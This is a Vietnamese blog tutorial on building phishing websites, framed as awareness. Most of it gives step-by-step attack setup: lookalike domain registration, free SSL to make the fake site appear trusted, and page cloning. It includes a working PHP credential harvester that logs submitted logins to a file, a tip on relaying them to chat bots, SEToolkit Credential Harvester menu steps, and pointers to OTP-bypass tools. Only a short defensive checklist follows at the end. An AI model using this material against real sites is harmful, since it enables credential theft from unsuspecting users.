![](https://images.viblo.asia/5f3b318c-51a2-4108-b77f-72eb490c34be.jpg)

> Lưu ý : Bài viết này không nhằm mục đích "vẽ đường cho Hươu chạy", thông qua nó mình chỉ muốn các bạn hiểu tường tận hơn về cách một Hacker tạo ra những Website giả mạo để tấn công người dùng. Qua đó nâng cao kiến thức cho bản thân để chủ động phòng tránh 

# 1. Phishing là gì ?
Bỏ qua những khái niệm mà bạn có thể dễ dàng tìm kiếm trên Google. Thì Phishing là một kỹ thuật tấn công xã hội, mà thông qua đó Hacker sẽ lừa bạn, dụ dỗ bạn để đạt được những thứ họ muốn ( Đa cấp biến tướng cũng là một hình thức Phishing) . 

Phishing thường gắn liền với hình ảnh đi câu cá là bởi lẽ để đạt được sự thành công sẽ luôn cần 3 yếu tố tiên quyết :**Sự nhẫn nại của người đi câu** (Hacker), **độ ngon của mồi** và **sự ngu của Cá**

Phishing hiện nay cực kỳ đa dạng và phong phú. Chúng ta có thể bị lừa thông qua bất cứ đâu, bất cứ phương tiện nào như SMS Phishing, Email Phishing hay Web Phishing. Trong thời đại phát triển mạnh mẽ về công nghệ thông tin như hiện nay, việc phát triển một công cụ lừa đảo cũng trở nên rất dễ dàng.

Trong bài viết dưới đây. Mình sẽ đi sâu về Web Phishing (Phishing thông qua Web)
# 2. Tiến hành Phishing
## 2.1. Xây dựng Web Phishing bằng "tay"

Về bản chất, Web Phishing hoạt động cũng không khác gì một Website thông thường. Tức là cũng phải sử dụng Domain, Server và các "gói" kèm theo

**Bước 1. Đăng ký Domain**

Bước này có lẽ sẽ quyết định tới 99% độ thành công của Web Phishing. Domain càng giống thật thì lại càng chiếm được sự tin tưởng của "người dùng". Ví dụ Website gốc ta có **bank-mni.com** thì có thể đăng ký **bank-nmi.com** hay **bank-mnL.com**. 

Nhưng thông thường, trong các quá trình tìm hiểu về Web Phishing bản thân mình thấy ít Hacker nào sử dụng luôn domain chính để tấn công. Có 2 hình thức mà họ thường hay sử dụng:

* Chiếm lấy tài nguyên của Website như Server hay Sub-Domain của Website  để thực hiện hành vi Phishing 
* Sử dụng SubDomain để phishing ( Ví dụ nếu **bank-nmi.com** là rất dễ để nhận dạng thì Hacker sử dụng domain **support-center.bank-nmi.com**)

Do trong bài viết này mình không Phishing ai cả, nên sẽ sử dụng luôn domain của mình để Demo

**Bước 2. Trỏ Domain về Server**

**Bước 3. Cài đặt môi trường**

Như đã nói ở trên, Web Phishing hoạt động giống như một Website thông thường. Nên mình cũng tiến hành cài đặt các package cần thiết

**Tiến hành cài đặt trên Ubuntu 20.10 LTS - GCP**

**Cài đặt Apache2**

```bash
sudo apt-get  update;
sudo apt-get upgrade -y
sudo apt-get install apache2 -y
```
![](https://images.viblo.asia/7e0ee8df-59e2-44ac-a319-d35a62687743.png)


**Cài đặt PHP**

> Nếu bạn sử dụng .Net hay Java làm ngôn ngữ tạo Web thì có thể cài đặt chúng. Ở đây mình sử dụng PHP nên sẽ cài PHP

```bash
sudo apt update
sudo apt install php libapache2-mod-php php-mysql
```
Sử dụng phpinfo() để kiểm tra

![](https://images.viblo.asia/0055c111-9dd5-4b5c-a22a-de3eca149862.png)


**Cài đặt SSL**

Đây có lẽ là một bước đột phá trong ngành công nghệ giả mạo Website. Nếu như trước kia, việc đăng ký SSL thực sự rất khó, phải nhiều giấy tờ chứng minh cùng với chi phí hàng năm không nhỏ để duy trì. Thì hiện nay sẽ rất đơn giản để bạn có thể tự đăng ký cho mình một SSL - nhanh chóng và miễn phí. 

`Các trình duyệt hiện tại sẽ mặc định đánh dấu những Website sử dụng SSL là bảo mật. Điều này sẽ gây nhầm tưởng nghiêm trọng tới tư duy của người sử dụng rằng cứ SSL là Website an toàn. Nên qua đó chúng ta cần phải hiểu rõ hơn rằng. SSL hoàn toàn không có tác dụng khi chúng ta bị tấn công Phishing `

```bash
sudo apt install certbot python3-certbot-apache
sudo certbot --apache
sudo certbot --apache -d web-phishing.com
```

![](https://images.viblo.asia/7676ada1-9d68-4a63-870d-7cddb385f4b9.png)

Như vậy là chúng ta đã có một Website "**An toàn**" được đánh giá bởi trình duyệt

![](https://images.viblo.asia/f74020b8-8473-4a89-9b55-d5bb476d67e5.png)


**Bước 3. Code**

Bước này là bước mình không thể mô tả chi tiết nhất. Bởi bản thân thấy nó rủi ro. Nên mình chỉ có thể diễn đạt một các sơ lược

**Crawl website gốc với Ctrl + S sao đó lưu vào Web Server**

![](https://images.viblo.asia/ca4bc543-ddca-4eb3-9587-8f2ec7707f5d.png)


![](https://images.viblo.asia/4172c6f9-3fff-4f0e-961b-6a2f3f1d5e39.png)


![](https://images.viblo.asia/25896ebe-ee33-4577-896c-7c615ac3b2bf.png)


Sử dụng PHP để tạo Web Phishing

```php
<?php
//lưu nó vào rồi redirect sang trang khi là dc

header("Location:https://www.website-phishing/"); 
$handle = fopen("pass.txt", "a");
foreach($_POST as $variable => $value) 
{
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
```
Vậy là Website đã hoàn thành, khi User nhập tài khoản và mật khẩu - các thông tin này sẽ tự động lưu trữ tại pass.txt.

```
Tip 1: (for Pentester): Không đặt pass.txt tại WebRoot hoặc chmod thật kỹ , tránh trường hợp người dùng tải về 
```
```
Tip 2: (for User): Trong trường hợp chúng ta vô tình nhập phải thông tin quan trọng, có thể sử dụng Brute-force để tấn công vào Web Phishing. Điều này sẽ làm Hacker không thể nhận biết đâu là tài khoản thật , đâu là tài khoản ảo 
```
```
Tip 3: Để thuận tiện hơn cho quá trình sử dụng, ta có thể kết hợp pass.txt với các Bot của Chatwork, Telegram , Discord ... 
```


## 2.1. Xây dựng Web Phishing bằng "Tools"

Phần demo dưới đây, mình sử dụng bộ công cụ tấn công Setoolkit . Đây là một công cụ rất nổi tiếng , chuyên biệt dành cho dạng tấn công này. 

**Cài đặt**

```bash
git clone https://github.com/trustedsec/social-engineer-toolkit
cd setoolkit
pip3 install -r requirements.txt
python setup.py
```

**Sử dụng**

**Khởi chạy**

`sudo setoolkit`

![](https://images.viblo.asia/7b696ae3-0993-448e-825e-f7f5ce2b6ba0.png)

Lựa chọn phương thức **1) Socia-Enginerring Attacks**

![](https://images.viblo.asia/330c91d1-18e3-448d-b2aa-fa054c241a56.png)

Lựa chọn phương thức **2) Website Attack Vectors**

![](https://images.viblo.asia/3237b6e7-122f-4bef-b82a-db5e3dbbf45e.png)

Tiếp đó lựa chọn phương thức **3) Credential Harvester Attack Method**

![](https://images.viblo.asia/bffa5e4a-4dc2-454a-be40-382c8a942b07.png)

Tiếp đó lựa chọn phương thức **1) Web Templates**  (Nếu website bạn muốn phishing là Facebook, Google, Amazon)
 
 Phương thức **2) Site Cloner** (Nếu Website bạn muốn phishing không có sẵn Templates)
 
 Sau khi chọn, Setoolkit sẽ yêu cầu IP của Attacker ( IP Public trong trường hợp bạn sử dụng trên VPS)
 
 ![](https://images.viblo.asia/23879a95-45da-4d46-897a-1fdcc7a8f9f4.png)

Sau đó nhập website bạn muốn tiến hành phishing

![](https://images.viblo.asia/053e6acd-37b5-47dd-ba54-ebcb9a308bb8.png)

Vậy là xong, khi người dùng truy cập vào website của bạn và nhập thông tin của họ. Setoolkit sẽ hiển thị ngay lập tức

![](https://images.viblo.asia/ee69b356-7579-485b-9be2-894e8c5f9674.png)

```
Tip: Hacker có thể dụng Metasploit Framework, BeeF Framework hay Evilginx để gia tăng hiệu quả tấn công (Malware/ bypass OTP)
```
# 3. Khắc phục
Việc phòng tránh phishing thực sự là một công việc vô cùng khó khăn. Bởi lẽ con người luôn là yếu tố dễ tổn thường nhất trong một cuộc tấn công mạng. Chúng ta thường bị lừa bởi những lời chào mời hay bị dẫn dụ bởi lòng tham **(biết là bị lừa mà vẫn lao vào để mong sao lừa được người khác** :grinning:)

Để hạn chế khả năng thành nạn nhân trên không gian mạng chúng ta cần :
- Tránh click vào những đường dẫn lạ, được gửi từ các email , số điện thoại không quen biết
- Không nhập các thông tin quan trọng khi chưa biết rõ độ an toàn của Website
-  Định kỳ thay đổi mật khẩu và các thông tin nhạy cảm
-  Tránh đặt mật khẩu giống nhau giữa các dịch vụ khác nhau
-  Cài đặt một số công cụ phát hiện chống lừa đảo (J2 Team Security, Chống lừa đảo....)
-  Nâng cao hiểu biết về tấn công mạng nói chung và phishing nói riêng